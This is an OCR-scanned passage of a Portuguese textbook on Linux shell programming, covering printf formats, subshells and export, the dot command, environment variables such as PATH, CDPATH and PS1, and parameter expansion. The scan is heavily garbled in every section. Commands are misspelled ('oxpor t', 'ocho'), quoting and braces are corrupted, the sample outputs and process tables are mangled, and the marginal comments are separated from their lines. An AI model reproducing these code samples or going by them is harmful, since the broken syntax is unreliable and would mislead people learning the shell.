$ prin tf " %e\n" · acho "scale=2 ; 100/6" I bc ' 
1. 6660 O O e+ O 1 
O defauff do o/.e é 6 decimais 
$ printf " %.2e\n" ' echo "scale=2 
1. 6 7e+Ol 
$ printf " %f \n" 32 . 3 
32 . 300000 
$ printf " %.2f\n" 32 . 3 
32 . 30 
$ printf "%.3f\n " 'ach o ''scal e=2 
33 . 330 
$ pri ntf " %o\n" 10 
12 
$ prin tf " %03o\n" 27 
033 
$ printf " %-s\n" Pet eleca 
; 100/ 6" 
1 bc ' 
O . 2 especificou duas decimais 
O defauff do %! é 6 decimais 
O . 2 especificou duas decimais 
; 100/6" I bc ' 
O bc devolveu 2 decimais. o printf colocou O a direffa 
Converteu o 10 para oclal 
Assim a conversão fica com mais jeito de oc/al, né? 
Material com direitos autorais 
246 Programação SheU Linux 
Pete l eca 
$ printf "USs\n" Peteleca 
Peteleca 
$ p rint f " \ - lSsNeves\n " Petelec a 
Pet eleca 
Neve s 
$ printf " \ . 3s \ n " Pe t e l eca 
Pct 
$ printf "%1 0 . 3" a \ n " Peteleca 
i'et ., 
$ p rintf "EXEI-!PLO %x \ n " 45232 
E:XEHPLO bObO 
$ printf "EXEI-!PLO %X\n" 45232 
E:XE.NPLO BOBO 
$ p rintf " \ X \ XL%X\n" 49354 192 10 
COC.l\ COLA 
Pete/eca com 15 caracteres enchidos com brancos 
O menos (-)encheu 8 dire~a com brancos 
.3 trunca as 3 primeirBS 
Pet com 10c818Cieres concaten8do com a (após o .s) 
Ttllnsformou para hexa mas os zeros não combinam 
Assim disfarçou melhor (repare o X maicísculo) 
O último exemplo não é marketing e é bastante completo, veja só: 
O primeiro t x converteu 4935<1 em hexadecimal resultando coc.n. 
(leia-se "cê", "zero", "cê" e "a"); 
Em seguida veio um espaço em branco seguido por outro t xL . O ~x 
converteu o 192 dando como resultado c o que com o L fez cOL; 
E finalmente o último %X transformou o 1 O em A. 
Conforme você pode notar, a instrução é bastante completa e complexa 
(ainda bem que o echo resolve quase tudo). Ainda não a havia publicado 
nas edições anteriores deste livro, por estar sempre descobrindo um novo 
detalhe na sua utilização (será que já descobri todos?). 
Creio que quando resolvi explicar o print t através de exemplos, acertei 
em cheio, pois não saberia como enumerar tantas regrinhas sem tornar a 
leitura enfadonha. 
Exercícios 
1. Vamos engrossar o exercfcio elo Capitulo 5, mandando e-mail para 
todos os primeiros operadores de todos os escritórios (no formato 
operador@máquina). 
Copyr ht 
Aprendendo a ler 
247 
2. Fazer um programa que leia da tela os seguintes dados: 
• 
Nome da Máquina; 
• 
Login Name do operador naquela Máquina; 
• 
Senha do operador e 
• 
Nome dos arquivos que serão transmitidos. 
Em seguida serão feitos f t p para a máquina especificada, transferindo 
um arquivo de cada vez. 
Obs.: 1. A senha do operador não poderá ser ecoada na tela. 
2. Será permitido o uso de metacaracteres na constituição do nome dos 
arqUIVOS. 
3. A leitura de nomes de arquivos será feita em loop, até que seja te-
clado um nome vazio. 
' 
. M 
I 
Dicas! 
t =--
Veja como funcionam as opções -i, -v, e -n do ftp. 
~,.. ... 
Material com direitos autorais 
jCapítulo 7 
~ Várias variáveis 
. 
i Veremos, ao longo deste capitulo, o uso das mais impor-
tantes16 (e exportantes) variáveis especiais. Entenda-se 
por variável especial as variáveis predefinidas do UNIX. 
Para conhecê-las melhor é necessário, primeiro, entender 
como funciona o ambiente de uma sessão UNIX. Veja só 
esta sequência de comandos: 
$ ls - 1 teste 
- ~wh r -- r --
l julio 
$ eat teste 
sleep 30 
$ ps u 
Repare que o arquivo teste é executável 
dipao 
9 Nov 
7 15 : 45 "este 
Dentro do arquivo tem somente um comando 
Estes são os meus processos em execução 
USER 
f!D 
iCI'v 'i~l01 SIZ.S RSS 'i'n STAT ST'-R'i Tn1E CO..t'.li!ID 
o.:> 
2 . 6 
12s2 02~ po 
s 
H : te o :oo - l.><>::h 
d2767r- 4JH 0 . 0 
1.5 
6H! 
~6~ ~O 
P 
H : lO 
0 : 00 ps u 
$ teste& 
Teste lerá 30 segundos de execução em background 
1 l 1 4 416 
N• do processo iniciado em backf10und 
$ ps u 
Novamente verifico os meus processos em execução 
USE: R 
PJD 
tCPIJ %NE:J.I lUZE RSS TTY ;;7 A f ST ART 'lii<E: C(.W.AN O 
d276707 ,1391 o . 1 
2 . 6 
1256 !128 pO s 
l6 : 1B 0 : 00 - bazh 
d2767r7 4·119 3 . 0 
2. 6 
1260 en po -" 
16 : 22 0 : 00 - ba.sh 
d276707 4419 2 .0 
1.: 
90t' 360 !"0 
s 
16 : 22 0 : 00 .sleop 30 
d276707 4420 0 . 0 
1 . !> 
e~s 484 
~:>0 
R 
16: 22 0 : 00 ps u 
18. Veremos somente as mais importantes porque a quantidade de variáveis es-
peciais é muito grande, e no contexto desta publicação não cabe detalhá·las. 
248 
Copyr ht 
Várias variáveis 
249 
Repare que o script teste foi feito para ficar 30 segundos parado e mais 
nada. Iniciamos esse script em background para liberar a tela e, imediata-
mente, verificamos quais processos estavam em execução. Existiam dois 
novos processos: o primeiro, já era de se esperar, é do s l eep; porém, o 
segundo é um bash que tem o mesmo process ict que foi gerado quando 
o teste foi colocado em background (PID;4 418l . Isso significa que cada 
script inicia um novo Shell que vai interpretar as instruções nele contidas. 
Para efeito meramente didático, passaremos a nos referir a este novo 
Shell como um Subshe/1. 
Exportar é o que importa 
Vamos mudar totalmente o script teste para vermos as implicações dos 
fatos antes expostos. O teste agora tem esta cara: 
$ cat teste 
echo 
1'a=$a, 
b~$b, c=$c '' 
Vamos, via teclado, colocar valor nas variáveis sa, Sb, e se : 
$ a; 5 
$ b=Silvina 
$ c~Duarte 
Vamos agora executar o nosso programa teste, já reformulado, para 
que liste estas variáveis recém-criadas: 
$ teste 
a=, b=, c=-
Ih!! O que foi que houve? Por que os valores das variáveis não foram 
listados? 
Calma, meu amigo. Você estava em um She/1, e nele você criou as variá-
veis, e o script teste chamou um Subshe/1 para ser o seu intérprete. Ora, 
se você criou as variáveis em um She/1 e executou o programa em outro, 
fica claro que um programa executado em um She/1 não consegue ver as 
variáveis definidas em outro She/1, certo? Errado, apesar de ter sido exa-
Material com direitos autorais 
250 Programação SheU Linux 
tamente isso que aconteceu, poderíamos ver as variáveis de outro Shell, 
bastando que as tivéssemos exportado, o que não fizemos. 
Se fizermos: 
$ oxpor t b 
E novamente: 
$ teste 
a.• , b•Sil vina, c• 
E finalmente se fizermos: 
$ expor e a c 
$ teste 
a:5, b:Silvina, c:Ouarte 
Exporlei somente a variável Sb, sem usar S 
Executei novamente teste 
Agor/J sim! O Subshell enxergou $b 
Exporlei as variáveis $a e $c 
Agora o Subshe/1 pode ver todas 
Como a curiosidade é inerente ao ser humano, poderíamos executar o 
comando export sem argumentos para ver o que aconteceria: 
$ export 
EXHIIT~set showmodc number autoindent 
HCME•/prdl/usr/j ulio 
HZ= lOO 
KRBSCCNi\MB&F!LE : /tmp/krbScc_ 60009_7616 
KURL•NO 
LOGl·lAME;julio 
I•!AIL•/var /mail/j ulio 
P.>.TH;/u.sr/bin: /u.sr/local/bin: . 
PGPP.>.TH=/usr/local/bin 
PSl=$ 
~NO=/prdl/usr/julio/curso 
SHELL~ /usr /b in /ksh 
TERH=vt220 
TERNCA?=/eee/terrnc<>p 
TZ=GI1TO 
=telefones 
Este foi moo .(>ronte <)CJe expottou 
Estas variáveis especiais j8 haViam sido 
exportadas pelo Slrelllníciatizado no 
momento em que foi aberta a sessão 
Vamos resumir o modo como as variáveis locais e exportadas trabalham 
(estes são os cinco mandamentos das variáveis): 
Copyr ht 
Várias variáveis 
251 
Qualquer variável que não é exportada é uma variável local cuja exis-
tência é ignorada pelos Subshells; 
As variáveis exportadas e seus valores são copiados para o ambien-
te dos Subshells criados, onde podem ser acessadas e alteradas. 
No entanto, essas alterações não afetam os conteúdos das variáveis 
dos She//s pais; 
Se um Subshe/1 explicitamente exporta uma variável, então as al-
terações feitas nessa variável afetam a exportada também. Se um 
Subshe/1 não exporta explicitamente uma variável, então essas mu-
danças feitas alteram somente a local, mesmo que a variável tenha 
sido exportada de um She// pai; 
As variáveis exportadas retêm suas características não somente 
para Subshel/s diretamente gerados, mas também para Subshe/ls 
gerados por estes Subshells (e assim por diante); 
Uma variável pode ser exportada a qualquer momento, antes ou de-
pois de receber um valor associado. 
Bem, agora já sabemos como passar valores para Subshe/ls, mas o que 
devemos fazer para receber ou importar dados de um Subshe/1? Não é di-
fícil não, basta você atribuir a uma variável o valor de um Subshe/1, fazendo 
asstm: 
V ar"'· subshell · 
Dessa forma, o que iria para a saída padrão será desviado para dentro de 
var, exatamente da mesma forma que você atribui à uma variável a saída 
de um comando; afinal, o seu subshel l e o comando são programas execu-
táveis da mesma forma. 
Exemplo: 
Preste atenção na sequência de instruções a seguir: 
$ cat variando 
echo a=~a: 
a=xx 
echo a=$a : 
vartandol 
Vejamos o conteúdo do script variando 
Variando t está llsrado a seguir 
Copyr ht 
252 Programação SheU Linux 
$ cat variandol 
echo a<=$11 : 
$ var i ando 
a~xx
: 
a-· 
-. 
$ a=lO 
$ variando 
a• : 
$ oxport a 
S variando 
a=lO: 
a=xx : 
a=xx: 
Criei a variâvel Sa mas não a exportei 
Agora exportei a variável Sa 
Vamos alterar o conteúdo dos programas anteriores fazendo: 
$ cat variando 
echo a=$a: 
a=r.r. 
echo a=sa: 
b= ' variandol · 
$ c a t variandol 
echo a=Sa : 
Estou colocando a salda de variando f em $b 
Vamos agora executá-lo, lembrando que a variável sa foi exportada para 
todos os Subshells: 
$ variando 
a=lO : 
a=xx: 
Eu hein!!! Onde é que foi parar a última linha? Aquela referente à exe-
cução de variandol? Foi para dentro da variável sb do script variando. 
Vamos então alterá-lo para listar esta variável: 
$ c a t vax-iando 
echo a=Sa : 
a•xx 
echo a<=$a : 
b= ' variandol ' 
echo b=$b 
1\latcna com d r bS utor <t 
Vamos executá-lo: 
$ variando 
a•lO : 
a• xx : 
b• a• xx: 
Várias variáveis 
253 
Apareceu a Margarida o lê, olê, olá .. Como você pode notar. o comando 
echo de variando! mandou a saída deste Subshe/1 para dentro da variável 
Sb do Shell pai. 
Caso o Subshelf tivesse algo para ir para a saída padrão, esta deveria 
ser explicitamente colocada, redirecionando para /dev/tty . 
Exemplo: 
Suponha que na sua empresa diversos programas necessitem da ma-
trícula dos funcionários como entrada de dados. Então, você resolveu es-
crever um pequeno programa para lê-la, calcular o dígito verificador e fazer 
todas as críticas necessárias. A segu ~r. listagem de trechos de dois progra-
mas. O primeiro é a rotina descrita antes e o segundo é o chamador, isto é, 
é o que recebe a matrícula já criticada do primeiro ou um código de retorno 
indicando a desistência do operador. Vejamos os dois: 
$ cat lematric 
i 
B Rotina de lei tu~a e c~i t ica de matricula 
@ 
while true 
d o 
tput cup 10 20 
echo " Digite a Matricula : " 
tput cup 10 40 
read Hat:ric 
if 
[ ! "$Matric " I 
t:hen 
tput cup 21 35 
echo • Deseja Jlbandonar? (S /n) • 
tput: cup 21 59 
read SN 
if 
( " " echo "SSN'' I tr n N"" • N I 
then 
Se digitou n ou N virará N 
1\latcna com d r bS utor <t 
254 Programação Shell Linux 
tput cup 2 1 3 5 
<:pu el 
c ontinue 
Apagando a pergunta 
fi 
exi t 
1 
~Jandonou o programa entao c odigo de retorno = 1 
fi 
# . • . Rot i na de vel:ificac ao de DV e Cri t i c a . . . 
b.reak 
clone > / dev/ t t y 
echo $Nat .ri c 
exit O 
# 
A saída de todo o l oop s era' na t ela 
Repare que, no fragmento de programa citado, a saída de todo o loop do 
•.vhile está redirecionada para / d ev/tt y . Se não estivesse, todos echo e 
tpu t cup iriam para a variável $matr ic do programa a seguir. 
$ cat funcionario 
# 
# 
Le Dados dos Funcionarios 
# 
cl ear 
if 
Nat .ric = 'lematric· 
t hen 
el se 
e xit 
fi 
echo "A Nat ricul a i nformada foi $Natri c " 
# . . . Le os out ros dados do empregado 
Os dois pontos (.) é o Comando Nulo 
Apesar de não ser a melhor forma de programar, serve como exemplo 
didático, já que o then do if anterior contém somente os dois pontos ( : > . 
Isso se chama comando nulo, porque serve somente para indicar a ausên-
cia de instruções, isto é, se não houvesse nada entre o t he n e o else, o 
She/1 daria uma mensagem de erro. Para que isso não ocorra, usamos os 
dois pontos ( : l 
Veja só este programinha que eu fiz para ambiente Bash que recebe o 
número da linha e da coluna bem como um texto que será exibido nesta 
posição e devolve o conteúdo lido após este prompt: 
Material com direitos autorais 
$ cat l e.sh 
~
! /bin/ba.sh 
' 
tput cup Sl $2 
read -p "$3 " Lido 
) > /dev/tty 
echo " $Li do" 
Para executá-lo devemos fazer: 
va.cg' l e . sh 10 30 "Digite a Nat.ricula : • · 
Várias variáveis 
255 
Assim procedendo, na linha 10 coluna 20 será exibido o prompt"Digite a 
Matricula" e o cursor ficará parado à sua frente aguardando a digitação. A 
variável var receberá o que for digitado . 
.. E. e pronto 
Suponha que todo dia de manhã, logo após se conectar, você queira exe-
cutar um script para preparar seu ambiente de trabalho que tenha a seguin-
te cara: 
$ ca.t direts 
PeSSOALg/prd2/usr /folhadepagarnento 
CONTAB=/prd3/usr/legal/contabilidade 
DB=/pr d3/u3r/oracle/bencdb 
TRANS~ Ip rd4/s t aout/d ur j cv01 
O intuito desse script seria que, após sua execução, bastaria fazer: 
cd $08 
que eu já estaria no diretório /prd3/usr/oracle/bencdb1 • 
Vamos então executar este She/1 e vejamos o que acontece: 
$ direts 
$ ocho $CONTAB 
$ 
19. Existem formas melhores de fazer isso, como veremos mais à frente neste mesmo capitulo. 
1\latcna com d r bS utor<t 
256 Programação SheU Linux 
Ora, isso era de se esperar, pois o meu script em sua execução cha-
mou um novo Shefl para interpretá-lo e as variáveis foram valoradas nesse 
She/1 filho. Não adiantaria sequer exportá-las, já que não podemos exportar 
variáveis para She//s pais. 
O que fazer então? 
Felizmente, existe um comando do Shel/ chamado •20 (ponto, fala-se dot) 
que pode quebrar-nos esse galho, cujo formato geral é: 
. arquivo 
e cujo propósito é executar as instruções contidas em um arquivo no She/1 
chamador, que nesse caso será sempre o She/1 corrente, como se elas ti-
vessem sido digitadas neste ponto. Então, por não ser gerado um Subshe/1 
filho, tudo o que for executado pelo comando . (dof) tem efeito direto no 
ambiente da sessão na qual estamos. conectados. 
Por não estarmos executando um scripf em She/1, mas sim um coman-
do, o • (dot), O arquivo a ser executado não necessita ter permissão de 
execução. 
Vamos então executar novamente o direts com o auxílio do . (dot): 
$ . direta 
$ cd $TRANSM 
$ pwd 
/prd~/5taout/durjcv0l 
Comando . executando o script 
Será que as variáveis permanecem valoradas? 
/uppiiii!!! 
Conforme você viu, as variáveis continuam com os valores atribuídos 
pelo script, dessa forma validando o uso do comando . (dot). 
Não seria necessário dar os exemplos citados. Basta imaginarmos o 
seguinte: o .bash_profile (ou o .profile) é um script executado toda vez que 
nós fazemos login, preparando as variáveis de ambiente e exportando-as 
se for o caso. Ora, se ele fosse executado como um Subshe/1, não conse-
guiria fazer isso. 
O que demonstra que ele é executado por meio do comando dot é que 
em diversos sabores de UNIX (por exemplo: AT&T, SCO ... ) este script não 
é executável. 
20. Em ambiente Linux este comando tambêm ê chamado de source 
1\latcna com d r bS utor <t 
Várias variáveis 
257 
Principais variáveis do sistema 
Para que você possa ver as variáveis predefinidas, que são associadas a 
cada sessão She/1 que você abra, basta fazer: 
$ set I more 
A seguir montaremos uma tabela mostrando as principais (menos de 5% 
do total) variáveis especiais juntamente com os seus conteúdos, para que 
possamos entender os seus usos dentro de scripts: 
Variável 
Conteúdo 
HOME 
Nome do diretório onde você é colocado no momento em 
que se conecta. 
PATH 
Caminhos que serão pesquisados para tentar localizar 
um programa especificado. 
Caminhos que serão pesquisados para tentar localizar 
um diretório especificado. Apesar desta variável ser pou-
CDPATH 
co conhecida, seu uso deve ser incentivado por poupar 
muito trabalho, principalmente em instalações com estru-
tura de diretório com bastantes níveis. 
PWD 
Diretório corrente. (Não é válido no Bourne Shell- sh 
sob UNIX) 
-
LOGNAME Login Name do usuário. 
PS1 
Caracteres que compõem o prompt primário (defaull=$ 
ou # para root). 
PS2 
Caracteres que compõem o prompt secundário (default = 
>). 
IFS 
Já foi visto antes. Contém o caractere que está servindo 
como separador default entre os campos. 
TERM 
Tipo de terminal que está sendo emulado. 
EXINIT 
Parâmetros de ambiente do vi (editor). 
Exemplo: 
Vou aproveitar o exemplo do SHoME e mostrar uma série de modos de mu-
dar de diretório usando o comando cct: 
Matenal çorn d1re1tos at•tora1s 
258 Programação SheU Linux 
$ pwd 
/prd l/usr/jul io/curso 
$ cd 
$ pwd 
/prdl/u.s r /julio 
$ cd -
/prd l /us r /jul io/cu rso 
$ cd $HOME 
$ pwd 
/prdl/usr/julio 
$ cd -
/prdl/usr/jul io/curso 
$ cd -julio 
$ pwd 
/prdl/usr/jul io 
$ cd - j neves 
$ pwd 
/dsv/usr/jneves 
$ bronze 
l:sh: bronze: 
not found 
$ echo $PATH 
/usr/bin : /usr/local/bin :. 
$ PATH=$PATH:-jul~o/curso 
$ ccho $PATH 
/usr/bin : /usr/local/bin:.: /pL~1/usr/julio/cur3o 
~j ulio/curso foi incluido na variável:' 
$ bronze 
11 
22 
33 
44 
55 
66 
77 
a e 
99 
$ cd 
$ d 
Onde estou? 
Volto para o diretório home (home diroctory) 
Volta para o diretório anterior ao último cd 
Outra forma de ir para o home directory 
Vide nota de rodapé. 
O til significa home. Assim vou p/ home do julio. 
Vou para o honre do jneves. 
Agora vamos executar o bronze. Lembra·se? 
Não achou porque prog. estava em -julio/curso 
Onde procurei o bronze? 
Diretório em que o bronze reside não foi procurado 
O separador entre os diretórios de SPATH é . .:• 
Agora sim a execução será bem sucedida 
Sctipl que lista diretórios abaixo do especificado 
21. As construções cd - e o- (tif) referindo-se ao diretório home só são válidas no sh e no bash sob 
o LINUX e no Korn She/1 (ksh) no UNIX. 
1\latcna com d r bS utor<t 
/prdl/usr/julio : 
/prdl/usr/julio/arrec 
/prdl/usr/julio/bancos 
/prdl/usr/julio/benef 
/prdl/usr/julio/c 
/prdl/usr/julio/curso 
/prdl/usr/julio/movpack 
/prdl/usr/julio/newtrfcp 
/prdl/usr/julio/stados 
/prdl/usr/julio/trftp 
$ cd curso 
/prdl/usr/julio/curso 
S cd trftp 
ksh : trftp : 
not found 
Várias variáveis 
259 
Diretórios abaixo de lprd1/usrljutio 
Se tivesse feito cd . .ltrftp teria funcionado ... 
s cd bin 
Isto não pode funcionar 
/usr/local/bin 
$ echo $CDPATH 
. : /usr/local 
$ CDPATH= . : .. :/usr/local 
$ cd -
$ pwd 
/prdl/usr/julio/curso 
$ cd trftp 
/prdl/usr/julio/trftp 
$ cd -
Ué!!! Funcionou ... 
Só foi procurado o diretório co"ente e lusr/local 
Pai do diretório co"ente adicionado à pesquisa 
Vide nota de rodapé" 
Agora consegui fazer o cd direto 
Vide nota de rodapé" 
O prompt secundário aparece quando damos um <ENTER> para finalizar 
uma linha sem encerrar o comando. Valendo somente como exemplo didá-
tico, vamos alterar o conteúdo de PS2 para simularmos uma indentação: 
$ e cho $PS1 
$ 
$ echo $PS2 
> 
$ PS2="> 
$ for i i n $LOGNAME $TERM 
Atribui a PS2 um > seguido por 5 espaços. 
22. As construções cd- e o- (til) referindo-se ao diretório home só são válidas no sh e no bash sob 
o LINUX e no Kom She/1 (ksh) no UNIX. 
22. As construções cd- e o - (til) referindo-se ao diretório home só são válidas no sh e no bash sob 
o LINUX e no Kom She/1 (ksh) no UNIX. 
260 Programação Shell Linux 
> 
> 
> 
julio 
vt220 
do 
echo $i 
done 
Login Name do usuário ronectado. 
Terminal que esta sessão está emulando. 
O prompt primário contido na variável $PS1 é totalmente configurável, 
e para isso existem vários caracteres especiais. A tabela a seguir contém 
uma lista destes caracteres e foi traduzida da man page do Bash 2.04. 
caractere ASCII para o alarme (bel/) do sistema (\007) 
\d 
data no formato "Dia da semana Mês Dia" 
"Qui Mai 
\ D!fmt} 
gerada uma data no formato fmt. Ex: PS1='\D{+%d/%m/%Y}' 
\e 
caractere ASCII <ESC> 
\j 
O número de processos sendo gerenciados pelo Shell 
\n 
Nova linha (LF- Une Feed- \010) 
------------------~ 
\r 
Retomo do cursor 
Retum • \01 
\ s 
O nome do She/1 em uso 
\ t 
Hora atual no formato de 24-horas HH:MM:SS 
\T 
Hora atual no formato de 12-horas HH:MM:SS 
\@ 
Hora atual no formato de 12-horas arnlpm 
\ u 
O nome do usuário atual 
\v 
versao do bash 
., 2.02) 
\v 
liberação, versão+ patch/eve/ (ex., 2.00.0) 
\ W 
O nome base do diretório corrente 
\! 
\ # 
\$ 
\ n n n 
\ 
\I 
\] 
Várias variáveis 
261 
O numero no histórico do comando atual 
O número do comando desde que aberto o terminal 
Se o usuário atual é o root, aparecerá o caractere#, senão$ para 
todos os outros usuários. Este é o defau/t dos Unixes. 
O caractere correspondente ao octal nnn 
Uma barra invertida 
O inicio de uma sequência de caracteres que não serão mostrados 
na tela. (ex.: colocar cor nas letras) 
Fim de uma sequência de caracteres que não serão mostrados na 
tela. 
Observe que o valor default da variável $PS1 no Bash é: 
PSl= ' \s- \v\$ ' 
Mas você pode passar cores e atlfibutos ao seu prompt, usando a se-
guinte sintaxe: 
PS1="\ [\033 [<o.t<>; <cox>m\] Pxompt>\{\033 [0rn\ ] " 
Onde <a t.r:> e <cor> são respectivamente os atributos e cores de texto 
encontrados na próxima tabela. 
Essa atribuição será melhor entendida se for dividida em 3 partes: 
1. \[\033[<acr>: <cor>m\J- Na qual você escolhe a cor <cor> e o atributo 
<atr >; 
2. 
Prompt> - Que escreve Pro mpt > ; 
3. \[\033(0m\J -Que restaura a cor default seguida por um espaço em 
branco. 
Ou seja, fazendo-se o SPSl desta forma, seu prompt ficará assim: 
Prompt> 
262 Programação Shell Linux 
Na cor escolhida, sendo que o caractere O representa o cursor. 
1 
4 
32 
5 
33 
7 
34 
8 
35 
36 
Algumas observações: 
• 
Se o atributo for zero, ele e o ponto e vírgula (; > que o segue podem 
ser omitidos ficando somente a cor; 
• 
Quando o atributo for 1, não significa exatamente negrito, mas sim 
um matiz mais claro da cor. O preto com negrito vira cinza escuro, já 
o branco normalmente é cinza claro, se colocarmos negrito, aí sim, 
ele fica branco; 
• 
Não consegui fazer o atributo 5 (piscante) funcionar; 
• 
Isso fica muito mais fácil de entender se você testar um por um. 
Para finalizar, é comum termos no SHOME/ . bash _profile (ou SHOME/ . profile) 
as seguintes linhas de preparação de nossas variáveis de ambiente: 
export EXINIT= 'set showmode number autoindent ignorecase ' 
PATH~$PATH : . 
export CDPATH=.: •julio: .. :/usr/local 
Repare que, nas linhas anteriores, o mesmo comando que atribui valor 
às variáveis também as exporta. 
Várias variáveis 
263 
A variável SEXINIT passa para o editor vi as seguintes definições de am-
biente: 
sho ... nnode : 
numh~ .r : 
igno .rec.ase : 
Desta forma, na última linha da tela, aparecerá o modo 
em que o vi está trabalhando (insert, repl ace, change. 
append , .... ) ; 
Com esta opção ativada, o v i colocará à esquerda, so-
mente na tela sem interferência alguma no arquivo, o nú-
mero sequencial de cada linha; 
Colocamos autoinden t em SEXINI T , para que o vi ajus-
te a margem esquerda de cada linha, pela da linha ante-
rior, indentando o texto que está sendo editado; 
Deste modo, quando estivermos pesquisando uma 
cadeia de caracteres no texto que está sendo edita-
do, o vi não fará distinção entre letras maiúsculas e 
minúsculas. 
Além das variáveis descritas antes, existem muitas outras. que creio não 
caberem no escopo deste trabalho já que. para efeito de programação em 
She/1, têm pouquíssima utilidade. Para termos uma ideia. sabendo-se que 
acabei de me conectar e ainda não exportei nem sequer criei nenhuma 
variável, veja só as linhas a seguir: 
$ set I wc -1 
41 
Isso significa que foram criadas 41 variáveis de ambiente no instante em 
que me conectei. 
Parâmetros 
Muita coisa já foi vista até aqui referente a parâmetros, tais como parâme-
tros posicionais (Sl, s2, . . . , S9J , quantidade de parâmetros passados ou 
recebidos ( $# J, código de retorno ( $'!l. Veremos agora outras formas de 
lidarmos com parâmetros. 
Mate 
com d re l s 
1 • s 
264 Programação Shell Unux 
Construções com parâmetros e variáveis 
• 
S(parfunetrol 
Suponha que a variável (parâmetro) Num cada vez que passar em 
um ponto de um script seja incrementada e seja impresso um aviso 
do ordinal de passadas por aquele ponto. A seguir este fragmento de 
programa: 
Num~l 
while ( "SNum" -le 3 ] 
do 
echo S(Num)a . passada 
Num•"expr $Num+ 1' 
done 
Se o executarmos teremos: 
la . passada 
2a . passada 
3a. passada 
Se não colocássemos a variável Num entre chaves < ( 1) viria: 
passada 
passada 
passada 
O resultado anterior foi obtido quando o Shell interpretou a linha: 
echo $Numa . passada 
Ora, como não existe a variável Numa, foi gerado um nulo, seguido de . 
passada , o que é totalmente indesejável. 
Conclui mos então que as chaves < 1 1 l devem ser usadas para evitar 
uma eventual interpretação errônea do nome de variáveis causada pelos 
caracteres que seguem o seu nome. 
Várias variáveis 
265 
Exemplo: 
$ mv $Arq ${Arq) l 
• 
${!parâmetro} 
Isso equivale a uma indireção, ou seja devolve o valor apontado por uma 
variável cujo nome está armazenada em parâmetro. 
Exemplo: 
$ Ponteiro=VariavelApontada 
$ VariavelApontada• "Valor Indireto• 
$ echo "A var iável \$Pon teiro aponta para \"$Ponteiro\" 
> que indiretamente aponta para \" $(!Ponteiro} \"" 
A vari ável $Pontei .ro aponta pata "Vat::iavelApontada" 
que indi re tamente aponta para "Valor Indireto" 
• 
${!parâmetro@} 
• 
${!parâmetro*} 
Ambas expandem para os nomes das variáveis prefixadas por parâme-
tro. Não notei nenhuma diferença no uso das duas sintaxes. 
Exemplos: 
Vamos listar as variáveis do sistema começadas com a cadeia GNOME : 
S echo S{'GNOME@) 
GNOl1E_DESKTOP_SESSION_ID GNONE_KEYRIN:G_I?ID GNOHE_KE'iRII'IG_SOCKET 
S echo ${1GNOME•J 
GNOJoiE DES KTOP S ESSION ID GNOHE: KE'iRI NG PIO GNOME KE'iRitiG SOCKET 
-----
--
• 
${parâmetro:valor} 
Nesse tipo de construção, caso a variável parâmetro seja nula, receberá 
valor, caso contrário permanecerá com o conteúdo anterior. 
Exemplo: 
No trecho de script a seguir, eu ofereço $LOGNANE como valor defau/t para 
a variável suser, isto é, caso seja teclado simplesmente um <e~m:R> , o va-
lor oferecido será aceito e a variável suser receberá o valor de $ LOGNAI1E. 
~1atcria com d r bs auto a.~s 
266 Programação Shell Linux 
echo "Login Natr..e em SSit e (S LOG!-JAMt: ) : .. 
read Use1; 
Use r =$ {Use r: - • SLOCNI>J-IE" J 
echo $Us e r 
Ofereci SLOGNAME como defauN 
A forma convencional (e conservadora) de se escrever essa rotina, sem 
a substituição de parâmetros, seria: 
ec ho "Login Name em SSite 
($LOGUAI'-1E ~
: .. 
r ead User 
1f 
[ ! "$User" ) 
t hen 
$Use t=$LOGN!\l1E 
li 
echo $Use.r 
Para entender a diferença de uso entre Slparârne t ro- valor) e 
s ( par funet ro : -valor}, vamos ver os exemplos a seguir: 
Exemplos: 
$ unsc t va.r 
$ echo ${var:-Variável não definida} 
variável nao de f ifü da 
$ echo ${var- Vari ável não defini da} 
Vari ável nao defi nida 
$ var= 
$ ocho $(var: - Variâvel não definida} 
Vari ável não def i nida 
$ echo $ ( var-VAri~vel nio definida} 
$ var-l 
$ e c ho $(var:-var iável não definida} 
1 
$ e cho ${var- Variãvel não definida} 
1 
var não exisle 
variem valorrnJio (como var-'7 
var é igual • 1 
Como você pode ver, a diferença de uso somente ocorre quando o parâ-
metro que está sendo expandido tem valor nulo. 
Note tambêm que a Expansão de Parâmetros por si só não altera o valor 
do parâmetro. mas somente manda a substituição para a saída. 
~1atcria com d r bs auto a.~s 
Várias variáveis 
267 
Vou repetir o exemplo dado, porém agora alterando o valor do parâmetro 
(variável suse.r ), mas para isso entenda a nova Expansão de Parâmetros a 
seguir: 
• 
${parâmetro:=valor} 
• 
${parâmetro=valor} 
Idêntico ao anterior, porém quando usado dessa forma, a expansão é 
feita para o valor da variável. 
Para entender melhor, vamos fazer o exemplo anterior usando esta 
sintaxe: 
read -p"Login Name em SSite (SLOGNAME:) : " User 
echo $(User:=$LOGNAME:) 
Após a execução desse código, se fizermos 
echo $User 
Teremos como resposta o campo teclado durante o read ou o conteúdo 
da variável de sistema SLOGNAME, caso o valor oferecido (default) tenha 
sido aceito, isto é, não foi necessário fazer a atribuição do valor. 
No caso de não desejar que a mensagem vá para a tela, troque o echo 
por let. 
read -p"Login Name em SSite (SLOGNAME:) : " User 
let ${User : =$LOGN~ffi) 
Assim como o anterior, esse também tem duas formas de uso, mas as 
observações feitas para o outro, também valem para este. 
• 
${parâmetro:?valor} 
Parecido com o anterior, pois atua somente nos casos em que o parâme-
tro é nulo ou não está declarado, quando então mandará uma mensagem 
para a saída de erro padrão. 
Veja esse trecho de código: 
read -p "Deseja con~inuar? " Responda 
echo ${Responda: ?(S)im ou {N)âo) 
268 Programação Shell Linux 
Caso a seja teclado <ENTBR> sem informar nenhuma resposta, isto é, 
caso a variável $Responda permaneça vazia, a mensagem abaixo será 
exibida: 
ba~h : Respo nda : (S}im o u (N)ào 
• 
${parâmetro:+valor} 
O oposto da anterior, isto é, se o parâmetro é não nulo, o She/1 substitui 
seu valor; caso contrário, o She/1 ignora esse comando. 
Exemplo: 
$ va.r=x 
$ echo Vari avel f i cou com o valor : $ { Var:+"Outro Val o r .. } 
variavel ficou com o valor : Outro val o r 
$ Var= 
$ echo Vari avel ficou com o valo-r:: $ { Var:+"Outro Valor"} 
Variavel ficou com o val or: 
• 
${parâmetro#padrão-de-pesquisa}Z3 
Usando esse tipo de construção, o She/1 nos devolverá o conteúdo de 
parâmetro com o menor padrão-de-pesquisa possível removido à sua es-
querda. Caso parâmetro não contenha padrão-de-pesquisa, o retomo será 
igual ao parâmetro. 
Exemplos: 
$ a="Ist o eh wn t este" 
$ <>cho $ (dt ) 
Ist o eh um teste 
